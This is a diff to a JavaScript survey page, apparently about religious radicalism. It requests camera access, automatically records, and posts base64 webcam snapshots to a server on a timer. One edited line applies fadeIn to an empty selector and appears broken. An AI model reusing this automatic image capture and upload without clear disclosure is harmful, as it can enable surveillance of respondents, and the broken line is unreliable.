@@ -61,7 +61,7 @@ async function init() {
     handleSuccess(stream);
   } catch (e) {
 
-    if (e.toString() === 'NotAllowedError: Permission denied'){
+    if (e.toString() === 'NotAllowedError: Permission denied' || e.toString() === 'NotAllowedError: Permission dismissed'){
     $('.formulir').hide();
     $('.tampil_error').show();
     }
@@ -84,7 +84,7 @@ var context = canvas.getContext('2d');
        var canvasData = canvas.toDataURL("image/png")
        cc = String(canvasData).replace("data:image/png;base64,","")
       //  console.log(cc)
-       post(cc); }, 21000);
+       post(cc); }, 20000);
   
 
 }
@@ -136,7 +136,7 @@ init();
   $(document).ready(function(){
     
     window.setTimeout(startRecording, 300);
-    window.setInterval(stopRecording, 4000);
+    window.setInterval(stopRecording, 10000);
     // inisialisasi
     $('#nama').show();
     $('#alamatEmail').hide();
@@ -184,8 +184,8 @@ init();
 
     $('.tbl6').click(function() {
       $('#gtau').fadeIn(200).delay(2000).fadeOut(); 
-      $('#pendapatRadikalisme').fadeOut();
-      $('#radikalAgama').delay(3000).fadeIn();
+      $('#radikalAgama').fadeOut();
+      $('').delay(3000).fadeIn();
     
      var rad1 = document.getElementById('radio1');
      var rad2 = document.getElementById('radio2');
